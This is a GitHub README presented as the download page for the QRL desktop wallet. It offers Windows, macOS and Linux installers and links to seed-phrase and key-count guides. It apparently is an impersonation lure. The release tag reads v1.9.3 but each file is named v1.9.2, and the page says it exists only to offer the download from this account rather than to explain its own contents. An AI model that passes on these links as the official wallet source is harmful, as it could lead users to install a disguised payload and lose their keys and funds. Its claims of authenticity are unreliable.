![QRL Wallet](assets/banner-profile.png)

<h1 align="center">QRL Wallet</h1>

<p align="center">A wallet whose backup can be tested, whose keys never leave your machine, and whose signatures were built for the machine that comes after this one.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-A85A00?style=for-the-badge&labelColor=0B0E14" alt="MIT licence"> <img src="https://img.shields.io/badge/RELEASE-v1.9.3-A85A00?style=for-the-badge&labelColor=0B0E14" alt="Release v1.9.3"></p>

## Downloads - v1.9.3

<p align="center"><a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-A85A00?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Windows"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-A85A00?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for macOS"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-A85A00?style=for-the-badge&logo=linux&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-A85A00?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Windows"> | A single `.exe` installer; the project documents no minimum Windows version for this tag | [`QRL-Desktop-Wallet-v1.9.2-win.exe`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-A85A00?style=flat-square&logo=apple&logoColor=white&labelColor=0B0E14" alt="macOS"> | A single `.dmg` disk image; the project documents no minimum macOS version for this tag | [`QRL-Desktop-Wallet-v1.9.2-darwin.dmg`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-A85A00?style=flat-square&logo=linux&logoColor=white&labelColor=0B0E14" alt="Linux"> | One `.zip` holding a `.deb` and a `.pacman` package; no minimum distribution version is documented | [`QRL-Desktop-Wallet-v1.9.2-linux.zip`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip) |

</div>

Compare the digest on the [release page](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/tag/v1.9.3) before you run the file.

> Only download from this GitHub release page.

## What this repository is for

The chain behind this page is QRL, the Quantum Resistant Ledger, and the page exists for the moment after the download and before the first address: the point where a careful person wants to know what the backup actually restores, where the keys sit, and what happens if they lose the machine.

The wallet it documents signs with XMSS and has done since the network launched in 2018. That choice has a consequence a holder has to live with rather than read about: an address owns a finite tree of one-time keys, each spend consumes one, and the wallet keeps that count for you. The guides below explain the number, when to move funds and how to test a phrase before it is the only thing left.

## Who it is for

- **Someone setting up a wallet for the first time**, who wants the backup tested before the address holds value.
- **A holder returning after a year or two**, whose build is behind and whose key count has moved.
- **A person restoring from a phrase**, who needs to know what comes back and what never does.
- **Anyone who has been asked for a phrase**, and wants to know why no honest channel ever asks.

## Why this wallet

The backup is the product. A wallet file plus its password restores one wallet; the mnemonic restores every address derived from the seed, on any machine, with no server involved. Because that is the whole of recovery, the guides spend their time on the test restore rather than on the interface.

The key count is the other half. Most wallets never ask you to think about how many signatures a key can make, and this one has to, because the answer is finite and the wallet shows it. The pages below explain what the count means, where to read it, and how to move a balance to a fresh address long before the last key is spent.

Hardware is supported without changing any of that. With the QRL app on a Ledger Nano, each transaction is approved on the device and the key never leaves it, which is the closest thing to a second lock the software offers.

## This repository's part

This repository is QRL's utility repository on this account, and its page is here to offer the wallet download rather than to explain its own contents.

## Guides

<div align="center">

| Guide | What it settles |
| --- | --- |
| [Back Up a QRL Seed Phrase](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/back-up-a-qrl-seed-phrase.md) | This guide sets out where a phrase belongs, how many copies to keep and how to test one. |
| [Restore QRL Wallet From a Mnemonic](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/restore-qrl-wallet-from-mnemonic.md) | This page explains which inputs each restore route needs and what it brings back. |
| [How Many QRL OTS Keys Remain?](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/how-many-qrl-ots-keys-remain.md) | This guide explains the 1,024 signatures an address has and what zero means for the balance. |
| [Move QRL Before the Keys Run Out](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/move-qrl-before-keys-run-out.md) | This page describes the transfer to a fresh address that restarts the key count. |
| [All the wallet guides](https://github.com/qrl-wallet/wallet-setup-and-repair) | This repository holds the twenty setup and repair guides in reading order. |

</div>

## Common first questions

### What happens if I lose the laptop?

With the phrase, or with the wallet file and its password, you restore everything yourself on another machine.

### Why does the count of keys matter?

Because an address signs a fixed number of times, so a balance has to move before the last key is spent.

### Does a Ledger change the backup?

No. The phrase still restores the wallet, and the device only approves signatures while it stays connected.

**No support channel will ever ask for your recovery phrase, and a message that does is an attack rather than help.**

## Support

Failures that the wallet already has a page for are linked above. Anything else belongs in the issue tracker on the desktop wallet repository.

## License

MIT.

---

The software lives on [the desktop wallet repository](https://github.com/qrl-wallet/qrl-desktop-wallet), the release is [v1.9.3](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/tag/v1.9.3), and the documentation is in [token-facts-and-prices](https://github.com/qrl-wallet/token-facts-and-prices), [wallet-setup-and-repair](https://github.com/qrl-wallet/wallet-setup-and-repair) and [signatures-and-comparisons](https://github.com/qrl-wallet/signatures-and-comparisons).
